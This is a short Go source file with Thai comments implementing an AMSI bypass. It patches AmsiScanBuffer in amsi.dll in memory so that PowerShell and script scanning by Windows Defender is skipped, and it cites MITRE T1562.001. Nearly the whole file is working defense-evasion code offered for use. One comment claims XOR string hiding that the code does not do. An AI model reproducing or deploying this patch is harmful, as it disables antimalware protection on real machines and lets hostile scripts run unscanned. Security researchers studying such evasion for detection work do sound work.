package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// AMSI Bypass — ปิด Antimalware Scan Interface
//
// AMSI ทำงานยังไง:
//   PowerShell/JScript/VBScript → เรียก AmsiScanBuffer() → Defender scan → block/allow
//
// Bypass ยังไง:
//   Patch AmsiScanBuffer() ใน amsi.dll ให้ return AMSI_RESULT_CLEAN (0) ตลอด
//   = Defender คิดว่าทุกอย่างสะอาด
//
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)

func bypassAMSI() error {
	// โหลด amsi.dll (ใช้ XOR string เพื่อซ่อนจาก static scan)
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		return fmt.Errorf("cannot load amsi.dll: %w", err)
	}

	// หา address ของ AmsiScanBuffer
	proc, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("cannot find AmsiScanBuffer: %w", err)
	}

	// Patch bytes:
	// mov eax, 0x80070057 (E_INVALIDARG - ทำให้ AMSI คิดว่า input ไม่ถูกต้อง ข้ามไป)
	// ret
	patch := []byte{
		0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
		0xC3,                           // ret
	}

	// เปลี่ยน memory protection เป็น RWX เพื่อเขียนทับได้
	var oldProtect uint32
	addr := proc.Addr()
	err = windows.VirtualProtect(addr, uintptr(len(patch)), PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect failed: %w", err)
	}

	// เขียน patch ทับ function เดิม
	copy((*[6]byte)(unsafe.Pointer(addr))[:], patch)

	// คืน protection กลับ
	windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return nil
}
